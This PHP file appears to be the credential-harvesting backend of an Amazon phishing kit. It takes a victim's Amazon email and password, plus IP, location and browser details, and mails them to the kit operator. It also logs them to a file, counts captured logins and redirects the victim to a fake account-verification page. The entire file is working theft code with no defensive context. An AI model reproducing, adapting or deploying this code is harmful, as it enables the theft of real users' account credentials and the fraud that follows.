<?php
session_start();
$user_agent = $_SERVER['HTTP_USER_AGENT'];
require "../functions/Mfunctions.php";
require "../functions/get_ip.php";
require "../../../config.php";
$from = $senderemail;
$headers = "From: $senderlogin <$from>";
$subj = "AMAZON SOMETHING [ ".$_SESSION['_LOOKUP_COUNTRY_']." - $ip ]";
$to = $Your_Email;
$data = "
.++======[ Amazon Login - Powered By SOMETHING ]======++.

    .++=====[ Amazon ]=====++.
Email       :   ".$_SESSION['_login_email_']."
Password    :   ".$_SESSION['_login_password_']."
        .++===[ End ]===++.

    .++=====[ PC Info ]=====++.
IP Address  :   ".$_SESSION['_LOOKUP_COUNTRY_']." - ".$_SESSION['_LOOKUP_REGIONS_']." ".$_SESSION['_LOOKUP_CITY_']." - ".$_SESSION['_ip_']."
Browser     :   ".$user_agent."
        .++===[ End ]===++.

.++======[ Powered By SOMETHING - Amazon Login ]======++.
";
mail($to,$subj,$data,$headers);
$empas   = "".$_SESSION['_login_email_']." | ".$_SESSION['_login_password_']." [ ".$_SESSION['_LOOKUP_COUNTRY_']." ]\n";
$file = "../../../logs/some-acc.log";
 $isi1  = @file_get_contents($file);
   $buka1 = fopen($file,"a");
    fwrite($buka1, $empas);
    fclose($buka1);
    
    $file2 = "../../../logs/some-login.txt";
    $isi  = @file_get_contents($file2);
    $buka = fopen($file2,"w"); 
    fwrite($buka, $isi+1);
    fclose($buka); 
header("Location: ../404.php?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
header("Location: ./settings.php?verify_account=session=".$_SESSION['_LOOKUP_CNTRCODE_']."&".md5(microtime())."&dispatch=".sha1(microtime())."");
?>